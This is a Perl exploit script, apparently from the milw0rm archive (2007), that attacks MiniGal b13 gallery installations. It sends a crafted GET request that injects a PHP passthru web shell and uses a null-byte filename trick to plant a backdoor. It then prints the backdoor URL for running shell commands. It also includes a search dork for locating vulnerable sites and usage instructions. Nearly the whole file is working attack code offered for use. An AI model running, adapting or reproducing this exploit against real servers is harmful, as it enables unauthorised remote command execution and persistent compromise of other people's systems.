#!/usr/bin/perl
# -=-=-=-=-=-=-=-=-=-=-=-=-=I=R=A=N=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                        # MiniGal b13 

# -=-=-=-=-=-=-=-=-=-=-=-=D=J=7=X=P=L=-=-=-=-=-=-=-=-=-=-=-=-=-

# -=-=-=-=-=-=-=-=-=-=-=-=-=I=R=A=N=-=-=-=-=-=-=-=-=-=-=-=-=-=-

# * Author :

            # Dj7xpl / Dj7xpl[at]Yahoo[dot]com

# * Type :

            # Remote Code Execution Exploit

# * Download :

            # http://www.minigal.dk
			
# * D0rk :

            # Powered by MiniGal (b13)

# -=-=-=-=-=-=-=-=-=-=-=-=D=J=7=X=P=L=-=-=-=-=-=-=-=-=-=-=-=-=-

# -=-=-=-=-=-=-=-=-=-=-=-=-=I=R=A=N=-=-=-=-=-=-=-=-=-=-=-=-=-=-
use IO::Socket;
if (@ARGV < 3){
print "

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
*                                                                             *
*    MiniGal b13  Remote Code Execution Exploit                               *
*                                                                             *
*    Usage   :  Xpl.pl [Target] [Path] [Backd00r Name] [Gallery Name]         *
*                                                                             *
*    Example :  Xpl.pl Dj7xpl.ir /minigal/ dj7xpl.php Pic                     *
*                                                                             *
*                    Vuln & Coded By Dj7xpl                                   *
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

";
exit();
}
$code = "<?passthru(\$cmd);?>";
$host=$ARGV[0];
$path=$ARGV[1];
$backdoorname=$ARGV[2];
$listname=$ARGV[3];
print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
print "\n[~] MiniGal b13 Remote Code Execution Exploit Vuln&Coded By Dj7xpl\n";sleep (2);
print "[~] Connect To http://".$host."\n";sleep (2);
print "[~] Create Backd00r";sleep (1);print ".";sleep (1);print ".";sleep (1);print ".";sleep (1);print ".\n";sleep (1);
print "[~] Backd00r: http://".$host."".$path."".$listname."/thumbs/".$backdoorname."?cmd=ls -la\n\n";
print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";

    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connect Failed.\n\n";
    print $socket "GET ".$path."index.php?input=".$code."&name=Dj7xpl&email=Dj7xpl@yahoo.com&chatinput=1&list=".$listname."&image=".$backdoorname."%00 HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";


# -=-=-=-=-=-=-=-=-=-=-=-=D=J=7=X=P=L=-=-=-=-=-=-=-=-=-=-=-=-=-

# Sp Tnx : Str0ke

# milw0rm.com [2007-04-17]